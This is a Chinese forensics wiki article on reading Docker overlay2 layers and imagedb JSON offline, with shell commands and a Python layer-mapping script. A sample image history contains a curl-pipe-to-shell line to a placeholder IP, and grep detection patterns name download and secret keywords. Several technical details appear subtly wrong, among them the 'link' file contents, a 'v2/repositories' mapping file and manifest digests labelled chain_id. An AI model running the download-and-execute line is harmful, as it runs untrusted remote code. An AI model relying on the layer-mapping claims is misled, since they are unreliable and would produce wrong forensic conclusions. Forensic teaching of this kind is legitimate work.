---
title: "镜像层与 overlay2 解析"
slug: "server-docker-overlay2"
canonical: "https://www.digiforensics.cn/wiki/server-docker-overlay2"
license: "CC-BY-SA-4.0"
author: "DigiForensics"
updated_at: "2026-10-09T12:51:48+08:00"
source_url: null
references: ["https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans"]
source_type: "wiki-sync"
category: "server"
space: "服务器与云取证"
node_path: ["Docker"]
---

# 镜像层与 overlay2 解析

<a id="section-1"></a>

## 一、概述

传统服务器取证里，"这个程序是怎么来的"通常没有答案。

你只能看到一个 ELF 可执行文件。它是发行版装的，还是源码编译的，还是从公网拉来的，文件本身不会告诉你。

**容器镜像在这一点上不同：它是可读的结构化数据。**

构建镜像的每一条指令——`RUN`、`ENV`、`COPY`、`CMD`——都逐字写在磁盘上。任何一台离线机器都能把这份"配方"完整还原出来。

这直接带来两个价值。

其一，恶意镜像可以被完全定性。

一个挖矿镜像的 `Cmd` 里白纸黑字写着矿池地址与钱包地址，一个后门镜像的 `Env` 里写着 C2 域名，一份被投毒的 `COPY` 能指出往镜像里塞了哪个文件。这些都不需要执行镜像，只需要读 JSON。

其二，镜像层本身就是文件证据。层内容是宿主 ext4 上的真实目录，被删掉的文件可以用常规文件系统手段挖出来。

**那为什么本篇还需要写一整篇？**

因为直接读磁盘有真实门槛。

`/var/lib/docker/image/.../imagedb/` 里的文件名是**不可逆的内容哈希**，层目录名是**随机的 cache-id**，二者之间没有可见映射。

要把"镜像配置里的 `RootFS.Layers` 列表"和磁盘上的"`overlay2/<id>/diff` 目录"对应起来，必须理解 diff_id 与 chain_id 这套双哈希体系。

这是本篇唯一真正难的地方。所有"我读了 imagedb 但找不到对应目录"这类困惑，来源都在这里。

**在取证流程中的位置**：本篇属于**分析环**，输入是 [Docker 取证工件地图](server-docker-docker-artifact-map.md) 已固定的磁盘数据，输出是**镜像与层的完整还原**。

采集不归它管，判定入侵也不归它管。它回答的是一个更窄的问题：这个文件系统是怎么一层层叠起来的，每一层里有什么。

上游依赖存储驱动的确认（见 [2.2](#section-4)），下游支撑三件事：**恶意镜像定性**（哪些层被投毒）、**文件植入定位**（哪个 `COPY` 指令带进来的）、**被删文件的恢复**（层里的 whiteout 语义）。

涉及的证据形态，具体到路径与字段：

| 形态 | 具体位置 | 结构特征 |
|---|---|---|
| 镜像配置 | `image/<driver>/imagedb/content/sha256/<hash>` | **一个文件一个镜像，文件名 = 配置哈希** |
| 仓库索引 | `image/<driver>/imagedb/toc/sha256/<hash>` | `Repositories` 清单，含 registry 与 tag |
| 层内容 | `overlay2/<cache-id>/diff/` | **真实目录，可直接遍历** |
| 层链 | `overlay2/<cache-id>/link` | 文本文件，**低层在前、高层在后**，是离线重建层链的关键 |
| 运行时视图 | `overlay2/<cache-id>/merged/` | **容器停止后为空壳，不适合作证据来源** |
| 工作目录 | `overlay2/<cache-id>/workdir/` | 正常为空，**有残留说明有未完成操作** |
| 层元数据 | 层目录下的 `v2/` | 该层的 `json`，指向 diff_id |
| 容器写层 | `overlay2/<container-id>/diff/` | **与镜像层不同**，是容器启动后新建的 |

两个概念必须先分清。

`diff/` 有两种来源——**镜像层**（只读，来自构建）与**容器写层**（容器启动时新建，装的是容器内的改动）。

看到 `diff/` 目录不等于看到镜像层。判断依据是它是否出现在某镜像配置的 `RootFS.Layers` 链里。

这个镜像由哪些指令构建、每条指令加了什么文件、镜像与某个磁盘目录的对应关系、某层里有哪些可疑文件、被删文件在层链里如何表现。

镜像是什么时候构建的（层时间可被改）、镜像是否被人改过又改回（需与私库侧摘要比对）、**容器运行时的行为**（层是静态的，运行痕迹要看 `containers/<id>/` 与日志）、`docker history` 的输出与磁盘数据是否一致（它是重建的，不是原始记录）。

存储驱动的版本差异是本篇的另一个门槛：Docker 17.06 之前默认 `aufs` 或 `devicemapper`，17.06 之后是 `overlay2`。前者的目录结构完全不同，后者的数据藏在块设备映射的稀疏文件里。

没有 overlay2 就没有"把层目录当普通目录遍历"这回事。

本篇给出三种驱动的处理思路，**以实际检材中存在的目录为准，不要凭印象套用。**

**内容边界**：所有命令面向**已获得合法授权**的目标主机或已制作的只读镜像，目标是发现与固定证据，**不提供任何入侵手段**。

**导出与运行恶意镜像是两回事**：本篇只做离线读取。`docker save` 的产物与原始层的差异见 [2.6](#section-8)。

**读者前提**：需要 ext4 目录结构与 inode 的理解（见 [ext4 结构与 inode](../../filesystem/filesystem-unix/filesystem-unix-ext4-inode.md)）、JSON 与内容哈希的基本概念，以及 [Docker 取证工件地图](server-docker-docker-artifact-map.md) 给出的路径全景与时机判断。

如果还没确认存储驱动，建议先按本篇 [3.1 第 1 步](#section-10) 走一遍。后面所有映射都建立在这个确认之上。
<a id="section-2"></a>

## 二、核心原理

<a id="section-3"></a>

### 2.1 overlay2 的四个目录

overlay2 把多个目录"叠"成一个视图。这四个目录是读层的前提：

```
        ┌──────────── 容器看到的 merged 视图 ─────────────┐
        │  /bin/sh 来自 lowerdir1   /app/config.yaml 来自 upperdir（★被改过）│
        └────────────────────────────────────────────────┘
              ↑ 挂载视图（merged/）
   ┌──────────┴──────────┐
   │  upperdir（写层）    │  ← 容器启动时创建，容器内每次写入都落这里
   │  /var/lib/docker/overlay2/<id>/diff/
   └──────────┬──────────┘
              ↑ 同文件时 upperdir 覆盖 lowerdir
   ┌──────────┴──────────┬──────────┬──────────┐
   │ lowerdir（只读层）   │ lowerdir │ lowerdir │  ← 来自镜像，自底向上叠加
   └─────────────────────┴──────────┴──────────┘
              ↑ 复制不完整时先复制到 workdir，再改名为 whiteout
```

| 目录 | 作用 | 取证意义 |
|---|---|---|
| **`diff/`** | **写层**。容器启动时创建，容器内所有改动落在这里 | ★★★★★ **容器内文件的实际存放处**；容器停止后仍可读，容器删除即消失 |
| **`merged/`** | 挂载视图，容器"看到"的那个根 | ★★ 容器停止后该目录变为空壳，**不适合作为证据来源** |
| **`workdir/`** | 内核做原子改名的工作目录 | ★ 正常为空；有残留说明有未完成操作 |
| **`link`** | 文本文件，记录本层的 `lowerdir` 链 | ★★★ **离线重建层链的关键** |
| （镜像层还有）`v2/` | 该层的 `repositories` 与 `json` 元数据 | ★★★ 指向 diff_id |

```bash
# link 文件长这样（低层在前，高层在后）
cat /var/lib/docker/overlay2/<cache-id>/link
# lxcfs
# overlay /var/lib/docker/overlay2/<id1>/diff
# overlay /var/lib/docker/overlay2/<id2>/diff
# overlay /var/lib/docker/overlay2/<id3>/diff
```

> ⚠️ **`link` 的顺序是从低层到高层**，overlay2 挂载时 `lowerdir=` 的优先级是**左低右高**（右覆盖左）。读错顺序会导致层内容还原错误。
<a id="section-4"></a>

### 2.2 目录结构全景（含版本差异）

`data-root`（默认 `/var/lib/docker`）下的关键路径：

| 路径 | 内容 | 取证价值 |
|---|---|---|
| `image/overlay2/imagedb/content/sha256/<hash>` | **镜像配置 JSON**（一个文件一个镜像，文件名 = 配置哈希） | ★★★★★ |
| `image/overlay2/imagedb/toc/sha256/<hash>` | 仓库层索引（`Repositories` 清单） | ★★★ |
| `overlay2/<cache-id>/diff/` | **层内容目录** | ★★★★★ |
| `overlay2/<cache-id>/link` | lowerdir 链 | ★★★ |
| `overlay2/<cache-id>/v2/`、`repositories` | 该层的镜像引用与 diff_id 记录 | ★★★ |
| `overlay2/<cache-id>/merged/`、`work/` | 挂载视图 / 工作目录 | ★ |
| `overlay2/l/` | 符号链接（`l/<短ID>` → `overlay2/<cache-id>`） | ★★ **cache-id 的来源** |

**版本差异务必按检材实际情况选路径**。下面这张表是查手册时的起点，不是让你凭版本号猜：

| 存储驱动 | 大致版本 | 关键路径 | 差异 |
|---|---|---|---|
| `aufs` | Docker ≤ 17.05（已停止维护） | `/var/lib/docker/aufs/mnt/<hash>/diff/`、`/var/lib/docker/aufs/diff/<hash>/` | 目录名是 `mnt` 前缀的挂载式结构，**元数据在 `aufs/mnt/` 下** |
| `devicemapper` | Docker ≤ 17.05 常见 | `/var/lib/docker/devicemapper/mnt/<dev>/` | **数据在块设备映射出的稀疏文件里，不能当目录遍历**；层元数据在 `<dev>/` 旁的 json |
| `overlay2` | **Docker 17.06 之后默认** | 上表所述 | 层内容是普通目录，可直接遍历 |
| `btrfs` / `zfs` | 特殊后端 | 子卷形态 | 需 `btrfs subvolume list` / `zfs list` 导出 |

> **如何判断**：`docker info` 的 `Storage Driver`；离线看 `daemon.json`；再退一步——`ls /var/lib/docker/` 里有什么目录就说明当时用的是哪个。**迁移期可能同时存在两种驱动目录，两个都要查。**

<a id="section-5"></a>

### 2.3 imagedb JSON 的关键字段

`imagedb/content/sha256/<hash>` 里是一个 JSON 对象，**这是"镜像配方"的完整记录**。

注意文件名。它是该 JSON 内容的哈希（`sha256`），不是镜像 ID。这条在 4.2 会被反复用到。

```json
{
  "created": "2024-02-20T08:14:22.617Z",
  "architecture": "amd64",
  "os": "linux",
  "Config": {
    "Hostname": "", "User": "nginx",
    "Env": ["PATH=/usr/local/sbin:/usr/local/bin:...", "DB_PASSWORD=Str0ngPass!2024"],
    "Cmd": ["nginx", "-g", "daemon off;"],
    "Entrypoint": ["/docker-entrypoint.sh"],
    "WorkingDir": "/app",
    "ExposedPorts": {"80/tcp": {}, "443/tcp": {}},
    "Volumes": {"/app/logs": {}},
    "Labels": {"maintainer": "ops@digiforensics.example", "build.args.ver": "1.4.2"}
  },
  "RootFS": { "Type": "layers", "Layers": ["sha256:a1b2...", "sha256:c3d4...", "sha256:e5f6..."] },
  "history": [
    {"created": "2024-02-20T08:14:22Z", "created_by": "/bin/sh -c #(nop) ADD file:... in / "},
    {"created": "2024-02-20T08:14:30Z", "created_by": "/bin/sh -c curl -s http://198.51.100.24/x.sh | sh", "empty_layer": true}
  ]
}
```

| 字段 | 含义 | 异常判据 |
|---|---|---|
| `Config.Env` | 运行时环境变量 | **含明文口令、令牌、私库地址**；`PATH` 被插到最前的自定义路径 |
| `Config.Cmd` / `Config.Entrypoint` | 启动命令 | 写死矿池地址、C2 域名、`curl \| sh` 下载执行链 |
| `Config.Labels` | 镜像元标签 | 官方镜像不该出现的自定义标签；`build.args.*` 泄露构建参数 |
| `Config.Volumes` | 镜像声明的卷 | 与运行时实际挂载对比，可发现**多挂的目录**（见[第 03 篇](server-docker-docker-volumes-and-bind-mounts.md)） |
| `Config.ExposedPorts` | 声明暴露端口 | 与 `Config.Cmd` 不符（如暴露 80 但实际起的是 minio 管理口） |
| `Config.WorkingDir` | 工作目录 | 指向 `/tmp`、`/dev/shm` 等可写临时目录 |
| `Config.User` | 容器内默认用户 | `root` + 挂载敏感目录 = 风险叠加 |
| `Config.Healthcheck` | 健康检查命令 | 指向外部地址的探活 = 隐蔽外连通道 |
| `created` / `architecture` / `os` | 构建时间与平台 | `created` 明显晚于依赖版本的发布时间 = 可疑 |
| **`RootFS.Layers`** | **diff_id 链，从基础层到顶层** | 数量与 `history` 中 `empty_layer` 为假的条目数应一致 |
| `history[].created_by` | **每层构建命令原文** | `curl \| sh`、`wget`、`base64 -d`、往 `/usr/bin` 拷可执行文件 |

> ⚠️ `history[].empty_layer` 为 `true` 表示这层没产生文件系统改动（如 `ENV`、`LABEL`、`CMD`），**它不出现在 `RootFS.Layers` 里**。所以 `history` 条目数**大于** `RootFS.Layers` 是正常的，不要据此认为少了层。

<a id="section-6"></a>

### 2.4 diff_id 与 chain_id：本文最关键的概念

这是 overlay2 体系里最容易搞混的一对哈希。两个都是 sha256，用途却完全不同：

| 概念 | 计算对象 | 是否含父层信息 | 用途 |
|---|---|---|---|
| **diff_id** | **单个层**（该层 tar 归档的摘要） | ❌ **不含** | `RootFS.Layers` 里存的就是它；**层内容去重的依据** |
| **chain_id** | **层 + 它的全部父层**（累积） | ✅ 含 | manifest 存储层索引里存的是它；**反映"从哪条链累积而来"** |

关键推论有两个。

第一个：两个镜像只要有一个基础层相同，其后每一层的 diff_id 就可能相同（因为 diff_id 只看自己那层的内容），**但它们的 chain_id 一定不同**（累积链不同）。

第二个：**diff_id 相同就能确定是同一层内容**，这是"识别共用基础层"的依据。

离线状态下怎么区分它们：

- `RootFS.Layers` 数组 → **diff_id**（它出现在镜像配置 JSON 里）
- `manifest.json`（`docker save` 产生）里的 `rootfs.diff_ids` → **diff_id**；同文件的 `layers[].digest` → **chain_id**（格式为 `sha256:<chain_id>`）
- `overlay2/<id>/v2/repositories` 文本文件里 → 可能同时出现 layer id（chain_id 形式）与历史 layer id（diff_id 形式）

```bash
# 离线判定一个 64 位十六进制串到底是哪种：去 diff 目录里找
# diff_id 通常能对上 overlay2/<cache-id>/v2/<diff_id 前缀>/ 之类的目录
grep -rl '<hash>' /mnt/df/var/lib/docker/overlay2/*/v2/repositories 2>/dev/null | head
```

> **取证价值**：diff_id 链能告诉你**这个镜像是从哪个基础镜像衍生的**。若一个可疑镜像的 `RootFS.Layers` 前 3 层与 `registry.local/digiforensics/web` 完全相同，说明它**共享了业务基础镜像**——攻击者不是从零构建的，而是拿业务镜像加了层自己的东西。这本身就是"内部来源"的有力证据。

<a id="section-7"></a>

### 2.5 `docker history` 的离线等价

在线的 `docker history` 读的正是 `imagedb` JSON 的 `history` 数组。离线等价实现见 3.3 的脚本（逐条打印并标注 `empty_layer`）。

真正值得停下来看的是这三类 `created_by`：

| 模式 | 含义 |
|---|---|
| `curl`/`wget` + 管道到 shell | 下载执行链 |
| `chmod +x` / `mv` 到 `/usr/bin`、`/usr/local/bin` | 安装持久二进制 |
| `adduser`、`usermod`、`authorized_keys`、`crontab` | 建立账号或持久化（对应[第 06 篇](../server-k8s/server-k8s-container-escape-and-runtime-artifacts.md)的运行态持久） |

<a id="section-8"></a>

### 2.6 导出与镜像保存：丢的东西不一样

这是两个用途完全不同、**混淆会导致关键元数据永久丢失**的操作。

丢的元数据回不去了。现场只留下一个 `export` 出来的 tar，启动命令和环境变量就再也回不去了。

| 特性 | `docker export` | `docker save` |
|---|---|---|
| 对象 | **容器**（某次运行的合并视图） | **镜像**（可复现的层 + 配置） |
| 输出 | 一个扁平 tar | 多层 tar + `manifest.json` + 各层 `json` |
| 镜像元数据（`Config`/`Labels`/`Env`/`history`） | ❌ **全部丢失** | ✅ 完整保留 |
| 卷内数据 | ❌ **不包含**（只导容器视图） | ❌ 不包含 |
| 层边界 | ❌ 拍平，无层信息 | ✅ 保留，可算 diff_id |
| 典型用途 | 拿到某个容器当时的**文件现场** | 归档/迁移一个**镜像** |

```bash
docker save -o /evidence/DigiForensics-app.tar registry.local/digiforensics/web:latest
docker export -o /evidence/container-view.tar digiforensics-app     # 只有文件，没有配方
tar -tvf /evidence/DigiForensics-app.tar | head                    # 应看到 manifest.json + 多个 layer/
tar -tf  /evidence/container-view.tar | head                      # 单一层扁平结构
```

> ⚠️ `docker export` 得到的 tar 里没有 `Config`，因此事后无法回答"这个容器当初用什么命令起的""注入了什么环境变量"。如果已经 export 而没有 save，配方只能从 `config.v2.json`（若还在）补。**取证时两个都要做，且先做 `save`。**

---

<a id="section-9"></a>

## 三、操作步骤

<a id="section-10"></a>

### 3.1 第 1 步：确认驱动与层目录规模

```bash
# 在线
docker info | grep -iE 'Storage Driver|Backing Filesystem'
docker image ls --no-trunc
# 离线
ls -1 /mnt/df/var/lib/docker/                        # 有 overlay2? aufs? devicemapper?
ls -1 /mnt/df/var/lib/docker/overlay2/ | wc -l      # cache-id 数量
ls -l /mnt/df/var/lib/docker/overlay2/l/ 2>/dev/null | head   # cache-id ←→ 短 ID 映射
```

<a id="section-11"></a>

### 3.2 第 2 步：读层链与层内元数据

```bash
# 挑一个层目录，看它的 lowerdir 链（从低到高）
CID=$(ls -1 /mnt/df/var/lib/docker/overlay2/ | grep -v '^l$' | head -1)
cat "/mnt/df/var/lib/docker/overlay2/$CID/link"

# 层内的 diff_id 记录与仓库引用
ls -l  "/mnt/df/var/lib/docker/overlay2/$CID/v2/" 2>/dev/null
cat     "/mnt/df/var/lib/docker/overlay2/$CID/v2/repositories" 2>/dev/null
cat     "/mnt/df/var/lib/docker/overlay2/$CID/v2/json" 2>/dev/null
```

> `v2/repositories` 里形如 `sha256:xxx`（**带冒号、多 64 位**）的是 layer/chain_id 记录；不带冒号或较短的 hex 段是历史 layer id。两者并存正是 diff_id 与 chain_id 双体系的直接体现，值得作为离线取证的锚点。

<a id="section-12"></a>

### 3.3 第 3 步：可运行的 Python 脚本 —— 汇总镜像与层信息

把上面的手工步骤变成可复用的分析脚本。下面这份只读、离线，不碰 daemon：

```python
#!/usr/bin/env python3
# 汇总 Docker 镜像的元数据与层链（离线，只读）
# 用法: python3 img_summary.py /mnt/df/var/lib/docker
#
# ★ 注意 imagedb JSON 的字段名是小写：顶层是 "config" 与 "rootfs"，
#   不是 "Config"/"RootFS"（后者是 docker inspect 输出的写法）。两种都用兼容读取。
import json, os, sys, glob, datetime

ROOT = sys.argv[1] if len(sys.argv) > 1 else "/mnt/df/var/lib/docker"
IMAGEDB = os.path.join(ROOT, "image/overlay2/imagedb/content/sha256")
OVERLAY = os.path.join(ROOT, "overlay2")

def pick(d, *names):
    """按顺序取第一个存在的键，兼容 imagedb(小写) 与 inspect(大写) 两种写法"""
    for n in names:
        if n in d:
            return d[n]
    return None

# 1) 建立 diff_id(64位hex) -> [cache-id, ...] 的反查表
#    v2/repositories 每行是 "diffID cacheID" 两个 token 成对出现
layer_ids = {}
for vd in glob.glob(os.path.join(OVERLAY, "*", "v2")):
    cid = os.path.basename(os.path.dirname(vd))
    rp = os.path.join(vd, "repositories")
    if not os.path.exists(rp):
        continue
    for line in open(rp, encoding="utf-8", errors="replace"):
        toks = line.split()
        if len(toks) >= 2:
            diff_hex, cache_hex = toks[0].replace("sha256:", ""), toks[1]
            if len(diff_hex) == 64:
                layer_ids.setdefault(diff_hex, []).append(cache_hex)

# 2) 有些版本的映射写在 v2 目录之外的 cache-id 反查表里，一并兜底
if not layer_ids:
    for vd in glob.glob(os.path.join(OVERLAY, "*", "diff")):
        cid = os.path.basename(os.path.dirname(vd))
        layer_ids.setdefault(cid, []).append(cid)

def fmt_ts(s):
    """Docker 时间戳有两种：RFC3339 字符串 与 Unix 秒"""
    s = str(s or "")
    if s.isdigit():
        return datetime.datetime.utcfromtimestamp(int(s)).strftime("%Y-%m-%d %H:%M:%S")
    return s.replace("T", " ").split(".")[0]

if os.path.isdir(ROOT):
    print(f"== 数据根: {ROOT}\
== 顶层目录: {sorted(os.listdir(ROOT))}\
")
else:
    print(f"[!] 数据根不存在: {ROOT}")

for f in sorted(glob.glob(os.path.join(IMAGEDB, "*"))):
    try:
        d = json.load(open(f, encoding="utf-8"))
    except Exception as e:
        print(f"[跳过] {os.path.basename(f)}: {e}")
        continue

    cfg = pick(d, "config", "Config") or {}
    rootfs = pick(d, "rootfs", "RootFS") or {}
    print("=" * 72)
    print(f"配置哈希  : {os.path.basename(f)}")
    print(f"创建时间  : {fmt_ts(d.get('created'))}   平台: {d.get('os')}/{d.get('architecture')}")
    print(f"User      : {cfg.get('User') or '(root = 未设 Config.User)'}    "
          f"WorkingDir: {cfg.get('WorkingDir') or '(未设)'}")
    print(f"Entrypoint: {cfg.get('Entrypoint')}\
Cmd       : {cfg.get('Cmd')}")
    print(f"Env       : {cfg.get('Env')}")
    print(f"ExposedPorts: {cfg.get('ExposedPorts')}")
    print(f"Volumes   : {cfg.get('Volumes')}")
    print(f"Labels    : {cfg.get('Labels')}")
    print(f"Healthcheck: {cfg.get('Healthcheck')}")   # ★ 可被做成隐蔽外连通道

    layers = rootfs.get("diff_ids") or rootfs.get("Layers") or []
    print(f"\
diff_id 链（{len(layers)} 层，自底向上）:")
    for i, lid in enumerate(layers):
        hexid = str(lid).replace("sha256:", "")
        cids = layer_ids.get(hexid)
        where = f"→ overlay2/{','.join(cids)}/diff" if cids else "→ 未在 overlay2 中找到（可能已 prune）"
        print(f"  [{i:02d}] {lid}\
       {where}")

    # chain_id 是把父层 id 一起哈希后的累计值，只能逐层推算，无法直接反查
    print("\
chain_id 推算（chainID = H(parent_chainID + ' ' + diffID)，逐层累计）:")
    parent = ""
    for i, lid in enumerate(layers):
        parent = "sha256:" + __import__("hashlib").sha256(
            (parent + " " + str(lid)).encode()).hexdigest()
        print(f"  [{i:02d}] {parent}")

    print("\
构建历史 (history):")
    real = 0
    for i, h in enumerate(d.get("history") or []):
        if h.get("empty_layer"):
            flag, real = "(empty_layer：不产生文件系统层)", real
        else:
            flag = f"[产生文件系统层 #{real}]"; real += 1
        print(f"  {i:02d} {fmt_ts(h.get('created'))} {flag} "
              f"{str(h.get('created_by'))[:110]}")
    print(f"\
实际文件系统层数: {real}   与 diff_id 数: {len(layers)}   "
          f"{'★ 一致' if real == len(layers) else '★ 不一致 → 配置被改或层被部分 prune'}\
")
```

**运行**：

```bash
python3 img_summary.py /mnt/df/var/lib/docker > /evidence/img-summary.txt
grep -nE 'curl|wget|base64|chmod \+x|198\.51\.100|PASSWORD|TOKEN' /evidence/img-summary.txt
```

> **脚本的取证意义**：它把"哪个 diff_id 对应磁盘上哪个层目录"这一步自动化了。输出中的 `→ overlay2/<cache-id>` 就是可以直接 `ls` 去的路径，`→ 未在 overlay2 中找到` 则说明该层已被 `prune`，是一个需要写进报告的"证据缺失"记录（不是"该层不存在"）。

<a id="section-13"></a>

### 3.4 第 4 步：直接遍历层内容（找被植入的文件）

overlay2 驱动下，层内容就是普通目录，可直接用文件系统工具：

```bash
# 找一个可疑文件在各层中的出现情况（★ 层越靠后越可能是植入层）
find /mnt/df/var/lib/docker/overlay2/*/diff \
     -name 'xmrig' -o -name '*.sh' -path '*/tmp/*' 2>/dev/null | head -20

# 某层的完整清单（用于确认这一层"新建了什么"）
find /mnt/df/var/lib/docker/overlay2/<cache-id>/diff -type f \
     -printf '%TY-%Tm-%Td %TH:%TM %s %p\
' 2>/dev/null | sort | head -60

# 只看某层新增的可执行文件（层内 mkdir 出来的文件通常属主是 root 且时间接近层创建）
find /mnt/df/var/lib/docker/overlay2/*/diff -type f -perm /111 \
     -printf '%TY-%Tm-%Td %TH:%TM %m %s %p\
' 2>/dev/null | sort -k1,2 | tail -40

# ★ 已删除文件恢复：Sleuth Kit 只能作用于分区/镜像，不能作用于已挂载的目录
#   -o 是该 ext4 分区相对整盘的起始扇区（用 fsstat -o 0 /dev/sda 逐个分区试出来）
fls -r -o 2000 -p /dev/sda 2>/dev/null \
  | grep -F 'var/lib/docker/overlay2/<cache-id>/diff' | head -30
icat -o 2000 /dev/sda 1234 > /evidence/recovered.bin
```

> **devicemapper 驱动怎么办**：层内容在块设备映射出的稀疏文件里，**不能 `find`**。可用的路径是：用 `docker save`（若 daemon 还在）导出后 `tar` 展开；或用 `strings`/十六进制查看器在映射设备节点上检索已知文件名与内容片段。**具体工具链以实际检材与可用软件为准**，本篇不给出可能失准的命令。

<a id="section-14"></a>

### 3.5 第 5 步：验证环节

| 验证对象 | 方法 | 通过标准 |
|---|---|---|
| `RootFS.Layers` 数量合理性 | 与 `history` 中 `empty_layer` 为假的条目数比对 | **两者相等**；不等说明配置被改动或层被部分 prune |
| diff_id → cache-id 映射 | 脚本输出 `→ overlay2/<id>` 后 `ls` 该目录确有其事 | 能对应上的层数 = 完整层数 |
| 层内容可读性 | `ls` 层 `diff/` 非空 | 非空即有效层；空目录 = 异常 |
| 导出完整性 | `docker save` 后 `tar -tf` 检查 manifest.json 与层数 | 层数与 `RootFS.Layers` 一致 |
| 配置 JSON 未被篡改 | 用文件名 = 文件内容的 sha256 反验 | `sha256sum <文件>` 与文件名一致即未被改动 |

```bash
# 验证配置 JSON 自身完整性：文件名就是它的 sha256
f=$(ls /mnt/df/var/lib/docker/image/overlay2/imagedb/content/sha256/* | head -1)
sha256sum "$f" | awk '{print $1}'; basename "$f"
# 两者相同 → 该 JSON 自洽（不是被拼接伪造的）
```

---
<a id="section-15"></a>

## 四、常见陷阱

镜像层的误判几乎都源自一组「看起来等价、实际不等价」的对应关系：`merged/` 与 `diff/`、diff_id 与 chain_id、cache-id 与 diff_id、声明卷与实际挂载、`save` 与 `export`。

本章按「先定位层 → 再解析映射 → 最后限定结论」三段归组，每条都指出混淆发生在哪一步、代价落在哪里。

<a id="section-16"></a>

### 4.1 层目录定位

<a id="section-17"></a>

#### 陷阱 1：用 `merged/` 找容器内文件

**现象**：进入 `overlay2/<cache-id>/merged/` 找可疑文件，发现目录是空的或只有少数系统文件，判定该容器内没有异常内容。

**原因**：`merged/` 是 overlay2 提供的**挂载视图**，只在容器运行期间由内核挂载填充。容器停止后这个目录会变成空壳（内容不可见），而容器的实际文件改动全在 `diff/`（upperdir）里。

**空 `merged/` 与空容器是两件事。**

**影响**：容器已停止的场景恰恰是取证价值最高的时候（见[第 01 篇](server-docker-docker-artifact-map.md)陷阱 6），此时 `diff/` 完整保留而 `merged/` 已失效。

判错目录等于主动放弃这批最容易拿到的文件证据。

**核查**：**证据来源只能是 `diff/`**。

先从 `config.v2.json` 或 `inspect` 的 `GraphDriver.Data.UpperDir` 拿到确切的 `diff/` 路径再操作。对已停止的容器，直接对该目录做只读遍历即可，不需要挂载，也不需要容器处于运行态。

<a id="section-18"></a>

#### 陷阱 2：把 `link` 的层序当成「上层在前」

**现象**：按 `link` 文件里的顺序从前往后叠加层内容，结果把高层的文件被低层的同名文件覆盖，还原出的文件系统和实际不符。

**原因**：`link` 里记录的顺序是**从低层到高层**（基础层在前、顶层在后）。而 overlay2 挂载时 `lowerdir=` 的优先级是**左低右高**，右边的层覆盖左边的同名文件。两者方向一致，容易让人凭直觉反向操作。

**影响**：还原出的文件系统是错的。

凡是基于「这个文件来自哪一层」得出的结论都会反转——本该是攻击者后来植入的文件，被判成镜像自带内容，性质从恶意变成正常。

**核查**：叠加时按 `link` 的**书写顺序依次覆盖**，最后一个赢。

脚本输出 diff_id 链时同样注意：`RootFS.Layers` 的第一个元素是基础层、最后一个是顶层，层号越大越靠近容器可写层，**层越靠后越可能是植入层**。

<a id="section-19"></a>

#### 陷阱 3：不确认存储驱动就按 overlay2 路径找

**现象**：在 Docker 17.06 之前的老系统上，直接 `find /var/lib/docker/overlay2/...`，什么都没找到，写下「该主机未使用容器或镜像已被清理」。

**原因**：17.06 之前默认驱动是 `aufs` 或 `devicemapper`，目录结构完全不同。`aufs` 用 `mnt` 前缀的挂载式布局，`devicemapper` 的层数据在块设备映射出的稀疏文件里，根本不存在 `overlay2/<id>/diff` 这样的目录树。

此外迁移期两种驱动的目录可能并存，只查一种会漏。

**影响**：这是把「路径体系不同」读成「数据不存在」。

真正要命的不是找不到，而是它会让人在报告里写下「无镜像」这类本可由 `docker info` 一行排除的结论。

**核查**：先定驱动再定路径。

`docker info` 的 `Storage Driver`、离线看 `daemon.json` 的 `storage-driver`、或直接看 `/var/lib/docker/` 下实际存在哪个目录，三条都行。

`devicemapper` 的层数据不能当目录遍历，处理方式完全不同（`docker save` 导出后分析，或对映射出的设备节点做内容检索）。

<a id="section-20"></a>

#### 陷阱 4：对已挂载的层目录直接用 `fls`

**现象**：想恢复容器内已删除的文件，直接 `fls -r /mnt/df/var/lib/docker/overlay2/<id>/diff`，工具报错或输出为空。

**原因**：Sleuth Kit 的 `fls`/`icat` 接受的是**分区或整盘镜像文件**，它要先解析文件系统超级块才能遍历。把一个已挂载的目录当输入，它没有文件系统结构可解析。

**影响**：不只是「恢复不出来」。

更隐蔽的是有人会因此写下「该容器内无已删除文件残留」，把工具用法的失败当成阴性发现。这类假阴性会掩盖容器内的痕迹清除行为。

**核查**：`fls -o <偏移> /dev/sda`，**偏移是该 ext4 分区相对整盘的起始扇区**（可用 `fsstat` 或 `mmls` 逐个试出来），输出再用 `grep` 过滤到层路径；`icat` 同样带 `-o` 定位到 inode 取回内容。

偏移算错时输出会明显异常。务必核对文件大小是否合理。

<a id="section-21"></a>

### 4.2 哈希体系与映射

<a id="section-22"></a>

#### 陷阱 5：把 `RootFS.Layers` 里的值当 chain_id

**现象**：拿 `RootFS.Layers` 的数组去比对仓库 manifest 里的 `layers[].digest`，发现对不上，判为「镜像被改过」或「层被替换」。

**原因**：两个都是 sha256，但计算对象不同。diff_id 是单层 tar 归档的摘要，不含任何父层信息；**chain_id 是层与其全部父层累积后的值**。`RootFS.Layers`（imagedb JSON）以及 `manifest.json` 的 `rootfs.diff_ids` 存的都是 **diff_id**，只有 `manifest.json` 的 `layers[].digest` 才是 chain_id。拿 diff_id 去比 chain_id，**永远对不上，且对不上是正常的**。

**影响**：这会制造一个看似强烈的篡改信号（"哈希不匹配"），足以把整个案件引向错误方向。

取证结论一旦建立在这一错误比对上，后续所有基于它的推断都要推翻。

**核查**：**判据是「是否含父层信息」**。

要判断两层是不是同一份内容，比 diff_id；要判断一层的累积归属，比 chain_id。

另外，`manifest.json` 里 `rootfs.diff_ids` 与 `layers[]` **两个数组长度必须相等**，这本身是一个现成的一致性校验点，不花钱就能做。

<a id="section-23"></a>

#### 陷阱 6：以为层目录名（cache-id）等于 diff_id

**现象**：拿到一个可疑镜像的 `RootFS.Layers[2]`，直接在 `overlay2/` 下找同名目录，找不到，判为该层缺失。

**原因**：层目录名是**随机的 cache-id**（现代版本是 base64 风格短标识），与内容哈希之间**没有可见映射**。`diff/` 的实际位置只能通过层内的 `v2/repositories` 文件反查。

**影响**：把「映射没做出来」当成「层不存在」。

这两个结论的差别是「映射方法没掌握」与「层被清理了」，而后者是必须写进报告的证据缺失记录。

**核查**：以 `overlay2/<cache-id>/v2/repositories` 为桥。

该文件每行是 diff_id 与 cache-id 两个 token 成对出现，据此建 `diff_id → cache-id` 反查表（3.3 的脚本已实现）。反查表建好后，脚本输出里的 `→ 未在 overlay2 中找到` 才是真正的「层已被 prune」信号。

<a id="section-24"></a>

#### 陷阱 7：`history` 条数多于 `RootFS.Layers` 就认为层缺失

